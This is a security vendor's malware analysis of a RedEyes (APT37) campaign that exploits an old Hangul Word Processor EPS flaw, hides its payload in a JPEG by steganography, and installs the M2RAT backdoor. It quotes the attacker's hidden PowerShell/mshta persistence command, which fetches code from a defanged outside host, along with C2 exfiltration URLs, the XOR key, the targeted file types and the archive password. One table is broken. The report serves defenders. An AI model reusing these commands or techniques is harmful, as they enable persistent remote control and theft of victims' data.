						<h1 class="post-title single_blog_inner__Title">
							HWP Malware Using the Steganography Technique: RedEyes (ScarCruft)						</h1>

												<div class="slider-post-meta-items tab-small-col-meta blog-details-meta-wrap">

				<div class="ck-content">
				
								<div class="post-featured-image">
									<img class="img-fluid" src="https://asec.ahnlab.com/wp-content/uploads/2023/02/60_north-korea-hacker_03-803x490.png?crop=1" alt="HWP Malware Using the Steganography Technique: RedEyes (ScarCruft)">

					<!-- Article content -->
					<div class="entry-content clearfix">
						
						<p>In January, the ASEC (AhnLab Security Emergency response Center) analysis team discovered that the RedEyes threat group (also known as APT37, ScarCruft) had been distributing malware by exploiting the HWP EPS (Encapsulated PostScript) vulnerability (CVE-2017-8291). This report will share the RedEyes group&#8217;s latest activity in Korea.</p>
<h2>1. Overview</h2>
<p>The RedEyes group is known for targeting specific individuals and not corporations, stealing not only personal PC information but also the mobile phone data of their targets. A distinct characteristic of the latest RedEyes group attack is the fact that they exploited the HWP EPS vulnerability using the steganography technique to distribute their malware.</p>
<p>The HWP EPS vulnerability used in the attacks is an old vulnerability that has already been patched in the latest version of the Hangul Word Processor. We assume that the threat actor initiated their attacks after checking in advance if their targets (individuals) were using an older version of HWP that supports EPS. Furthermore, there is a confirmed past case where the RedEyes group used the steganography technique to distribute malware. In 2019, <a href="https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/">Kaspersky shared a report saying that the ScarCruft (RedEyes) group&#8217;s downloader used the steganography technique</a> to download additional malware.</p>
<p>The usage of the steganography technique to download malware and the RUN key command for autorun registration to establish a consistent connection with the C&amp;C server being similar to the format used by the RedEye group in the past are the reasons why we believe they had done this attack.</p>
<p>The RedEyes group is also known for using Powershell and the Chinotto malware to steal PC information and remote control systems. However, a new malware strain was found in the latest attack which, unlike Chinotto, uses the shared memory section to carry out C&amp;C commands.</p>
<p>Regarding the newly identified malware, the ASEC analysis team named it <strong>M2RAT (Map2RAT)</strong> after the name found in the shared memory section.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/1-2.png?resize=654%2C308&amp;ssl=1" alt=""></figure>
<p>This report covers the TTPs (Tactics, Techniques, and Procedures) of the RedEyes group&#8217;s initial access, defense evasion, persistence, and the newly identified M2RAT&#8217;s latest command control and exfiltration.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/2-3.png?resize=1024%2C410&amp;ssl=1" alt=""></figure>
<h2>2. Analysis</h2>
<h3>2.1. Initial Access</h3>
<p>On January 13, an HWP EPS vulnerability (CVE-2017-8291) attack involving the usage of the filename &#8220;Form.hwp&#8221; was discovered by AhnLab&#8217;s ASD (AhnLab Smart Defense). The HWP document was not collected at the time of the analysis, but we were able to procure the EPS file that triggered the aforementioned vulnerability.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/3-1.png?resize=1024%2C179&amp;ssl=1" alt=""></figure>
<p>EPS is a type of graphic format that uses the PostScript programming language by Adobe to show graphics. High-resolution vector images can be shown through EPS and the Hangul Word Processor supported a third-party module (ghostscript) to process EPS files. However, due to an increase in malicious EPS vulnerability exploitations, such as APT attacks, <a href="https://www.hancom.com/board/noticeView.do?artcl_seq=6606">Hancom has removed the third-party EPS processing module</a>.</p>
<p>Additionally, the ASEC analysis team posted <a href="https://image.ahnlab.com/atip/content/atcp/tistory/1239_AhnLab_ASEC_한글파일에숨어든고스트.pdf">a detailed analysis report on the CVE-2017-8291 vulnerability</a> back in 2019.</p>
<p>The &#8220;Form.hwp&#8221; file includes a vulnerable EPS file (CVE-2017-8291) which is shown in Figure 4. When the user opens the file (&#8220;Form.hwp&#8221;), the vulnerability allows the threat actor&#8217;s shellcode to run through the third-party module.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/4-2.png?resize=911%2C208&amp;ssl=1" alt=""></figure>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/5.png?resize=653%2C558&amp;ssl=1" alt=""></figure>
<p>The shellcode downloads an image file (JPEG) from the threat actor&#8217;s server (C&amp;C) and decrypts the encoded PE file contained within the image file. Afterward, it creates the PE file in the %temp% path before executing it.</p>
<h3>2.2. Defense Evasion</h3>
<p>The shellcode downloaded an image file from the threat actor&#8217;s server and executed an additional piece of malware. In other words, the threat actor used the steganography technique to embed a malware strain within an image. We assume that this was done to evade network detection. It appears that the steganography image file used by the threat actor was obtained from a wallpaper-sharing website called &#8220;wallup.net&#8221;.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/6.png?resize=1024%2C613&amp;ssl=1" alt=""></figure>
<p>The image file consists of a normal JPEG header, the meta data required for decoding the PE file (XOR key and file size), and the encoded PE file.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/7.png?resize=787%2C492&amp;ssl=1" alt=""></figure>
<p>A 16-byte XOR key is used for PE decoding to XOR 1 byte at a time.</p>
<ul>
<li>16-byte xor key : FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49<br />(0xFD xor 0xB0) = 0x4D (M)<br />(0xDD xor 0x87) = 0x5A (Z)<br />(0x28 xor 0xB8) = 0x90<br />(0xF5 xor 0xF5) = 0x00<br />(*&nbsp;MZ is the signature of the PE file.)</li>
</ul>
<p>The ultimately decoded PE file is created and executed under the name lskdjfel.exe in the %temp% path. The executed PE file is responsible for downloading an additional backdoor malware (M2RAT), injecting it into explorer.exe, and adding both Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with the threat actor&#8217;s server.</p>
<h3>2.3. Persistence</h3>
<p>The executed lskdjfel.exe file registers the following command to the registry Run key to establish a persistent connection with the threat actor&#8217;s server.</p>
<ul>
<li>Registry key path: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
<li>Value name: RyPO</li>
<li>Value: c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 340328 2.2.2.2 || mshta hxxps://www.*****elearning.or[.]kr/popup/handle/1.html</li>
</ul>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/8.png?resize=683%2C516&amp;ssl=1" alt=""></figure>
<p>The command registered to the registry Run key was found to be similar to <a href="https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/">that of the ScarCruft (RedEyes) group report published by Kaspersky in 2021</a>.</p>
<p><strong>[ScarCruft&#8217;s registry Run key command in 2021 (by Kaspersky)]</strong></p>
<ul>
<li>c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 300000 2.2.2.2 || mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html</li>
</ul>
<p>[<strong>RedEyes (ScarCruft) registry Run key command in 2023</strong>]</p>
<ul>
<li>c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 340328 2.2.2.2 || mshta hxxps://www.*******elearning.or[.]kr/popup/handle/1.html</li>
</ul>
<p>Whenever the affected host PC is booted up, the registry key causes Powershell and the normal Windows utility, mshta, to also be executed. At the time of analysis, an HTA (HTML Application) file containing a JS (JavaScript) code was collected from the &#8220;1.html&#8221; file that mshta had downloaded from the threat actor&#8217;s server.</p>
<p>The JS code is responsible for executing the Powershell command, which receives and executes commands from the threat actor&#8217;s server, and returns the results.</p>
<p>When the Powershell adds a &#8220;U&#8221; parameter to the threat actor&#8217;s server address when transmitting the computer name and username, the threat actor&#8217;s server encodes the CMD command that is going to be executed in BASE64 before sending it to the affected host. The encoded BASE64 command is then decoded by Powershell and executed. The result of the command is saved as a file in the %temp%\vnGhazwFiPgQ path. Afterward, an &#8220;R&#8221; parameter is added to the threat actor&#8217;s server which then encodes the command execution result in BASE64 before sending it.</p>
<ul>
<li>hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?<strong>U=[Computer Name]+[Username]</strong>&nbsp;// Receive the threat actor&#8217;s command</li>
<li>hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?<strong>R=[BASE64-encoded]</strong>&nbsp;// Send command execution result</li>
</ul>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/9.png?resize=1024%2C850&amp;ssl=1" alt=""></figure>
<h3>2.4. M2RAT (Map2RAT)</h3>
<p>The ultimately executed backdoor operates after being injected into explorer.exe. The main features of this backdoor are similar to those of basic remote control malware, which include keylogging, data leakage (files and recordings), running or terminating processes, and capturing screenshots.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/15-1.png?resize=479%2C535&amp;ssl=1" alt=""></figure>
<p>However, the recently discovered backdoor has a different command system compared to the previously identified Chinotto malware. It does not save the keylogging data or screenshot logs in the affected system but instead sends them to the threat actor&#8217;s server, leaving no traces of the stolen data in the affected system.</p>
<p>The ASEC analysis team named this newly identified malware M2RAT (<strong>Map2</strong>RAT) after the common name within the shared memory section used during C&amp;C communication.</p>
<ul>
<li>FileInput<strong>Map2</strong></li>
<li>ProcessInput<strong>Map2</strong></li>
<li>CaptureInput<strong>Map2</strong></li>
<li>RawInput<strong>Map2</strong></li>
<li>RegistryModuleInput<strong>Map2</strong></li>
<li>TypingRecordInput<strong>Map2</strong></li>
<li>UsbCheckingInput<strong>Map2</strong></li>
</ul>
<h4>2.4.1. Command and Control of M2RAT</h4>
<p>M2RAT&#8217;s C&amp;C communications command system involves receiving commands from the threat actor&#8217;s server through the POST method&#8217;s Body. The meaning of these command can be found in the below Table 1.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/10.png?resize=566%2C388&amp;ssl=1" alt=""></figure>
<figure class="table">
<table>
<tbody>
<tr>
<td><strong>C&amp;C Command</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>OKR</td>
<td>Command received upon initial connection with C&amp;C communications</td>
</tr>
<tr>
<td>URL</td>
<td>Edits the registry key value to update the C&amp;C</td>
</tr>
<tr>
<td>UPD</td>
<td>Updates the currently connected C&amp;C</td>
</tr>
<tr>
<td>RES</td>
<td>Ends C&amp;C connection (End M2RAT)</td>
</tr>
<tr>
<td>UNI</td>
<td>Ends C&amp;C connection (End M2RAT)</td>
</tr>
<tr>
<td>CMD</td>
<td>Performs remote control commands (Keylogging and process creation/execution)</td>
</tr>
</tbody>
</table>
</figure>
<p style="text-align:center;"><span style="color:#6B7684;font-size:14px;">Table 1. Description of threat actor&#8217;s commands</span></p>
<p>M2RAT&#8217;s threat actor server manages hosts with MAC addresses in order to distinguish affected hosts. When infected with M2RAT, the MAC address is encoded (XOR) with 0x5c and saved in the &#8220;HKCU\Software\OneDriver&#8221; path&#8217;s &#8220;Version&#8221; value. The encoded MAC address value is used to distinguish affected hosts in the threat actor&#8217;s server.</p>
<ul>
<li>Registry key path: HKCU\Software\OneDriver</li>
<li>Value name: Version</li>
<li>Value: Value that XOR-encoded (0x5c) MAC address of the affected host</li>
</ul>
<p>The result value of the command sent by the threat actor to the affected host is saved in the &#8220;_Encoded MAC Address Value_2&#8221; folder of the threat actor&#8217;s server. The screenshots taken by M2RAT from the affected host are saved in the &#8220;_Encoded MAC Address Value_cap&#8221; folder. (Refer to Figure 12)</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/11.png?resize=914%2C161&amp;ssl=1" alt=""></figure>
<p>Additionally, M2RAT XOR encodes with 0x5c and saves the threat actor&#8217;s server address info in the &#8220;Property&#8221; value of the same registry key path as the MAC address.</p>
<ul>
<li>Registry key path: HKCU\Software\OneDriver</li>
<li>Value name: Property</li>
<li>Value: Value that XOR-encoded (0x5c) threat actor&#8217;s server address</li>
</ul>
<p>In the future, the threat actor can transmit the &#8220;URL&#8221; and &#8220;UPD&#8221; commands to M2RAT to update their server address (Refer to Table 1). The &#8220;URL&#8221; command is used to update the registry key with a new address and the &#8220;UPD&#8221; command is used to change the threat actor&#8217;s address defined in the currently running instance of M2RAT.</p>
<p>The remote control command of M2RAT is established by transmitting CMD commands from the threat actor&#8217;s server. The Chinotto malware, which was confirmed to have been used by the RedEyes group in the past, executed remote control commands through the <i><strong>Query String</strong></i> method, but M2RAT creates a shared memory section to execute the commands from the threat actor&#8217;s server. Like the threat actor&#8217;s use of the steganography technique in the initial breach stage, this appears to also be for the purpose of evading network detection by hiding the command info in the Body of the POST.<br />(<i><strong>* Query String</strong></i>: A string that starts with a question mark at the end of a URL)</p>
<p>The CMD command is transmitted through the shared memory. The memory section name info is shown below in Table 2.</p>
<figure class="table">
<table>
<tbody>
<tr>
<td><strong>Section Name</strong></td>
<td><strong>Feature</strong></td>

</tr>

<td>ProcessInputMap2</td>

</tr>
<tr>
<td>RawInputMap2</td>

<tr>

</tr>

<p style="text-align:center;"><span style="color:#6B7684;font-size:14px;">Table 2. Features of the shared memory section</span></p>
<h4>2.4.2. Exfiltration</h4>
<p>M2RAT&#8217;s exfiltration features include screenshots of the affected host&#8217;s screen, process information, keylogging information, and data (documents and voice files) leaks. In the case of screenshots, they are taken regularly even if a command is not given by the threat actor. They are then sent to the threat actor&#8217;s server where they are saved as &#8220;result_[number]&#8221; in the &#8220;_Encoded MAC Address Value_cap&#8221; folder.</p>
<p>The remaining data leaks are saved in the &#8220;_Encoded MAC Address Value_2&#8221; folder.</p>
<p>If there are documents or voice recordings with sensitive data in removable storage devices or shared folders, then these are copied into the %TEMP% path, compressed into a password-protected file with Winrar (RAR.exe), and the results are then transmitted to the threat actor&#8217;s server.</p>
<ul>
<li>Folder path where data is copied to: %Temp%\Y_%m_%d_%H_%M_%S // (e.g. %TEMP%\Year_Month_Date _Hour_Minute_Second)</li>
<li>File extensions: hwp, doc, docx, xls, xlsx, ppt, pptx, cell, csv, show, hsdt, mp3, amr, 3gp, m4a, txt, png, jpg, jpeg, gif, pdf, eml</li>
</ul>
<p>The RAR.exe options that are used are as follows. The path the compressed file is created into is the same as the %TEMP% folder path.</p>
<ul>
<li>a -df -r -hp&nbsp;<strong>dgefiue389d@39r#1Ud</strong>&nbsp;-m1 &#8220;Compressed file creation path&#8221; &#8220;Compression target path&#8221;</li>
</ul>

<p>The ASEC analysis team was also able to uncover through the ASD (AhnLab Smart Defense) infrastructure an Infostealer communicating with M2RAT. This malware was identified as a .NET file that steals files saved on mobile phones and sends them to the <strong>RegistryModuleResultMap2</strong> shared memory section of M2RAT.</p>
<figure class="image"><img decoding="async" src="https://image.ahnlab.com/atip/content/atcp/2023/02/13.png?resize=985%2C414&amp;ssl=1" alt=""></figure>

<ul>
<li>PDB : E:\MyWork\PhoneDataCp\PhoneDeviceManager\PhoneDeviceManager\obj\x86\Release\PhoneDeviceManager.pdb</li>
</ul>
<h2>3. Conclusion</h2>
<p>The RedEyes group is an APT hacking organization that is supported on a national level. They are known to attack individual targets such as human rights activists, reporters, and North Korean defects. Their aim appears to be exfilitration. Defending against such APT attacks is an extremely complicated process. Especially since the RedEyes group is known to target individuals instead of corporations. It is difficult for individuals to even realize they have been affected. The ASEC analysis team is closely tracking this group. Should a new TTPs be found from this threat actor, we will quickly share the details as we did in this blog post to contribute towards minimizing damage.</p>
